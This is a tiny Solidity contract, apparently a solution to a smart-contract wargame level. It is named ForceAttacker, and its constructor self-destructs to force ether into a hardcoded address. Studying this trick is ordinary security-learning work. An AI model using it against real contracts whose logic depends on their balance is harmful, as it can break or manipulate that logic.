// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";

contract ForceAttacker {
    constructor() public payable {
        selfdestruct(payable(0xcD9F4AECBf19d7f912fe18F5871a80AEb9Ee93d3));
    }
}
